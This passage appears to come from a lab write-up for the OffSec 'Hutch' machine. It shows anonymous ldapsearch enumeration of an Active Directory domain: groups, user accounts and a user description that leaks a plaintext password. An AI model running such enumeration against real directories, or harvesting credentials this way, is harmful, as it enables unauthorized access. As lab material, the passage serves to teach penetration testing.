+dn: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Domain Guests
+description: All domain guests
+distinguishedName: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12351
+memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
+uSNChanged: 12353
+name: Domain Guests
+objectGUID:: 8IN1upAPCUqFJVGtzCE2ew==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAgIAAA==
+sAMAccountName: Domain Guests
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Group Policy Creator Owners, Users, hutch.offsec
+dn: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Group Policy Creator Owners
+description: Members in this group can modify group policy for the domain
+member: CN=Administrator,CN=Users,DC=hutch,DC=offsec
+distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12354
+memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offse
+ c
+uSNChanged: 12391
+name: Group Policy Creator Owners
+objectGUID:: CC/2IAwkpk+RkSicEUmVCA==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnCAIAAA==
+sAMAccountName: Group Policy Creator Owners
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# RAS and IAS Servers, Users, hutch.offsec
+dn: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: RAS and IAS Servers
+description: Servers in this group can access remote access properties of user
+ s
+distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12357
+uSNChanged: 12359
+name: RAS and IAS Servers
+objectGUID:: jwjGdt4Qfk2M0XMn8FMiVg==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnKQIAAA==
+sAMAccountName: RAS and IAS Servers
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Allowed RODC Password Replication Group, Users, hutch.offsec
+dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Allowed RODC Password Replication Group
+description: Members in this group can have their passwords replicated to all 
+ read-only domain controllers in the domain
+distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutc
+ h,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12402
+uSNChanged: 12404
+name: Allowed RODC Password Replication Group
+objectGUID:: 5ErycQkHo02pMg1/xxJNIQ==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnOwIAAA==
+sAMAccountName: Allowed RODC Password Replication Group
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Denied RODC Password Replication Group, Users, hutch.offsec
+dn: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Denied RODC Password Replication Group
+description: Members in this group cannot have their passwords replicated to a
+ ny read-only domain controllers in the domain
+member: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
+member: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
+member: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
+member: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
+member: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
+member: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
+member: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
+member: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
+distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch
+ ,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12405
+uSNChanged: 12433
+name: Denied RODC Password Replication Group
+objectGUID:: I0YqHi+34U+yrPKy8jL7YA==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnPAIAAA==
+sAMAccountName: Denied RODC Password Replication Group
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Read-only Domain Controllers, Users, hutch.offsec
+dn: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
+
+# Enterprise Read-only Domain Controllers, Users, hutch.offsec
+dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Enterprise Read-only Domain Controllers
+description: Members of this group are Read-Only Domain Controllers in the ent
+ erprise
+distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutc
+ h,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12429
+uSNChanged: 12431
+name: Enterprise Read-only Domain Controllers
+objectGUID:: xkuEQsOH+UekvpicNYDyqw==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGn8gEAAA==
+sAMAccountName: Enterprise Read-only Domain Controllers
+sAMAccountType: 268435456
+groupType: -2147483640
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Cloneable Domain Controllers, Users, hutch.offsec
+dn: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Cloneable Domain Controllers
+description: Members of this group that are domain controllers may be cloned.
+distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12440
+uSNChanged: 12442
+name: Cloneable Domain Controllers
+objectGUID:: IOOLFwbLHU+szn+H1kGShg==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnCgIAAA==
+sAMAccountName: Cloneable Domain Controllers
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Protected Users, Users, hutch.offsec
+dn: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Protected Users
+description: Members of this group are afforded additional protections against
+  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
+ 298939 for more information.
+distinguishedName: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12445
+uSNChanged: 12447
+name: Protected Users
+objectGUID:: mA4Fn/4sO0q/fsDXx5HOhg==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnDQIAAA==
+sAMAccountName: Protected Users
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Key Admins, Users, hutch.offsec
+dn: CN=Key Admins,CN=Users,DC=hutch,DC=offsec
+
+# Enterprise Key Admins, Users, hutch.offsec
+dn: CN=Enterprise Key Admins,CN=Users,DC=hutch,DC=offsec
+
+# DnsAdmins, Users, hutch.offsec
+dn: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: DnsAdmins
+description: DNS Administrators Group
+distinguishedName: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052702.0Z
+whenChanged: 20201104052702.0Z
+uSNCreated: 12486
+uSNChanged: 12488
+name: DnsAdmins
+objectGUID:: oohK2PE1PUydvjjBS/KBzw==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTQQAAA==
+sAMAccountName: DnsAdmins
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# DnsUpdateProxy, Users, hutch.offsec
+dn: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: DnsUpdateProxy
+description: DNS clients who are permitted to perform dynamic updates on behal
+ f of some other clients (such as DHCP servers).
+distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052702.0Z
+whenChanged: 20201104052702.0Z
+uSNCreated: 12491
+uSNChanged: 12491
+name: DnsUpdateProxy
+objectGUID:: QVU11mCC40GAeAjr+EUd7w==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTgQAAA==
+sAMAccountName: DnsUpdateProxy
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Rosaline Placidi, Users, hutch.offsec
+dn: CN=Rosaline Placidi,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Rosaline Placidi
+distinguishedName: CN=Rosaline Placidi,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12759
+uSNChanged: 12763
+name: Rosaline Placidi
+objectGUID:: ZnXcaol0h0O06eCHssgsaw==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417051062737
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: rplacidi
+sAMAccountType: 805306368
+userPrincipalName: rplacidi@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Otto Patry, Users, hutch.offsec
+dn: CN=Otto Patry,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Otto Patry
+distinguishedName: CN=Otto Patry,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12765
+uSNChanged: 12769
+name: Otto Patry
+objectGUID:: Z/B36x+G7EKQOh7bdq2Gdg==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417052162728
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUAQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: opatry
+sAMAccountType: 805306368
+userPrincipalName: opatry@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Lyndsie Taunton, Users, hutch.offsec
+dn: CN=Lyndsie Taunton,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Lyndsie Taunton
+distinguishedName: CN=Lyndsie Taunton,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12771
+uSNChanged: 12775
+name: Lyndsie Taunton
+objectGUID:: osEKgirap0C06Opb/Wc8lQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417052642725
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: ltaunton
+sAMAccountType: 805306368
+userPrincipalName: ltaunton@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Arlyn Costello, Users, hutch.offsec
+dn: CN=Arlyn Costello,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Arlyn Costello
+distinguishedName: CN=Arlyn Costello,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12777
+uSNChanged: 12781
+name: Arlyn Costello
+objectGUID:: OdMef64Ah0apX2/LyqiHYA==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417053152725
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUgQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: acostello
+sAMAccountType: 805306368
+userPrincipalName: acostello@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Johnnie Sparwell, Users, hutch.offsec
+dn: CN=Johnnie Sparwell,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Johnnie Sparwell
+distinguishedName: CN=Johnnie Sparwell,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12783
+uSNChanged: 12787
+name: Johnnie Sparwell
+objectGUID:: y1RU3ceaqEyn1XecBNhkVQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417053772722
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: jsparwell
+sAMAccountType: 805306368
+userPrincipalName: jsparwell@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Ottilie Knee, Users, hutch.offsec
+dn: CN=Ottilie Knee,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ottilie Knee
+distinguishedName: CN=Ottilie Knee,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12789
+uSNChanged: 12793
+name: Ottilie Knee
+objectGUID:: /bMvDx/e506T4lQ+rB8/FA==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417054332736
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVAQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: oknee
+sAMAccountType: 805306368
+userPrincipalName: oknee@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Joan McKendry, Users, hutch.offsec
+dn: CN=Joan McKendry,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Joan McKendry
+distinguishedName: CN=Joan McKendry,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12795
+uSNChanged: 12799
+name: Joan McKendry
+objectGUID:: awivgHuoDEKrRWtvGV31rQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417054922729
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: jmckendry
+sAMAccountType: 805306368
+userPrincipalName: jmckendry@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Alexia Victoria, Users, hutch.offsec
+dn: CN=Alexia Victoria,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Alexia Victoria
+distinguishedName: CN=Alexia Victoria,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12801
+uSNChanged: 12805
+name: Alexia Victoria
+objectGUID:: pYkiH0wnEUGtTvJmed1oTQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417055452791
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVgQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: avictoria
+sAMAccountType: 805306368
+userPrincipalName: avictoria@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Jane Frarey, Users, hutch.offsec
+dn: CN=Jane Frarey,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Jane Frarey
+distinguishedName: CN=Jane Frarey,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12807
+uSNChanged: 12811
+name: Jane Frarey
+objectGUID:: ixEEnk99f0WcwVSNK+e+oA==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417056032732
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: jfrarey
+sAMAccountType: 805306368
+userPrincipalName: jfrarey@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Editha Aburrow, Users, hutch.offsec
+dn: CN=Editha Aburrow,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Editha Aburrow
+distinguishedName: CN=Editha Aburrow,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12813
+uSNChanged: 12817
+name: Editha Aburrow
+objectGUID:: +7Byu5JQuU2TfrLSegT8VQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417056522726
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWAQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: eaburrow
+sAMAccountType: 805306368
+userPrincipalName: eaburrow@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Claus Luddy, Users, hutch.offsec
+dn: CN=Claus Luddy,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Claus Luddy
+distinguishedName: CN=Claus Luddy,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12819
+uSNChanged: 12823
+name: Claus Luddy
+objectGUID:: XXbxCiLxHkKjA7Pd0VTq1A==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417057032735
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: cluddy
+sAMAccountType: 805306368
+userPrincipalName: cluddy@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Arthur Gitthouse, Users, hutch.offsec
+dn: CN=Arthur Gitthouse,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Arthur Gitthouse
+distinguishedName: CN=Arthur Gitthouse,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12825
+uSNChanged: 12829
+name: Arthur Gitthouse
+objectGUID:: PQ8QTFNtw0elgPkzWaOmHA==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417057602730
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWgQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: agitthouse
+sAMAccountType: 805306368
+userPrincipalName: agitthouse@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Freddy McSorley, Users, hutch.offsec
+dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Freddy McSorley
+description: Password set to CrabSharkJellyfish192 at user&apos;s request. Please c
+ hange on next login.
+distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20210216133934.0Z
+uSNCreated: 12831
+uSNChanged: 49179
+name: Freddy McSorley
+objectGUID:: TxilGIhMVkuei6KplCd8ug==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132489437036308102
+lastLogoff: 0
+lastLogon: 132579563744834908
+pwdLastSet: 132489417058152751
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 2
+sAMAccountName: fmcsorley
+sAMAccountType: 805306368
+userPrincipalName: fmcsorley@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+lastLogonTimestamp: 132579563744834908
+msDS-SupportedEncryptionTypes: 0
+
+# Domain Administrator, Users, hutch.offsec
+dn: CN=Domain Administrator,CN=Users,DC=hutch,DC=offsec
+
+# search reference
+ref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec
+
+# search reference
+ref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec
+
+# search reference
+ref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 42
+# numEntries: 38
+# numReferences: 3</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ ldapsearch -H ldap://192.168.131.122 -x -W -b &quot;dc=hutch,dc=offsec&quot;
+Enter LDAP Password: 
+# extended LDIF
+#
+# LDAPv3
+# base &lt;dc=hutch,dc=offsec&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# hutch.offsec
+dn: DC=hutch,DC=offsec
+
+# Administrator, Users, hutch.offsec
+dn: CN=Administrator,CN=Users,DC=hutch,DC=offsec
+
+# Guest, Users, hutch.offsec
+dn: CN=Guest,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Guest
+description: Built-in account for guest access to the computer/domain
+distinguishedName: CN=Guest,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052540.0Z
+whenChanged: 20201104052540.0Z
+uSNCreated: 8197
+memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
+uSNChanged: 8197
+name: Guest
+objectGUID:: VKtEAAOQ8ki8PKRBs7xH+A==
+userAccountControl: 66082
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 0
+primaryGroupID: 514
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGn9QEAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: Guest
+sAMAccountType: 805306368
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# krbtgt, Users, hutch.offsec
+dn: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
+
+# Domain Computers, Users, hutch.offsec
+dn: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Domain Computers
+description: All workstations and servers joined to the domain
+distinguishedName: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12330
+uSNChanged: 12332
+name: Domain Computers
+objectGUID:: SuBXv87h/Uq0hS9itdhc7g==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAwIAAA==
+sAMAccountName: Domain Computers
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Domain Controllers, Users, hutch.offsec
+dn: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
+
+# Schema Admins, Users, hutch.offsec
+dn: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
+
+# Enterprise Admins, Users, hutch.offsec
+dn: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
+
+# Cert Publishers, Users, hutch.offsec
+dn: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Cert Publishers
+description: Members of this group are permitted to publish certificates to th
+ e directory
+distinguishedName: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
